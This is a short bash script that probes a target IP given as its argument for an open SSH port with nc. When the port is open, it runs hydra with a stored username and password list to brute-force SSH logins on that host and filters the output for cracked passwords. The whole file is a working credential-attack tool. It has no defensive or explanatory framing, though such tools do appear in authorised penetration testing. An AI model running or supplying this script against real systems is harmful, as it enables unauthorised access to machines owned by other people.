#!/bin/bash

WAIT=2
DPORT=22

#sleep 30
if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] bruteforcing ssh'
	hydra -C on_client/bruteforce/piata_ssh_userpass.txt "ssh://$1" | grep 'password:' --color=auto
fi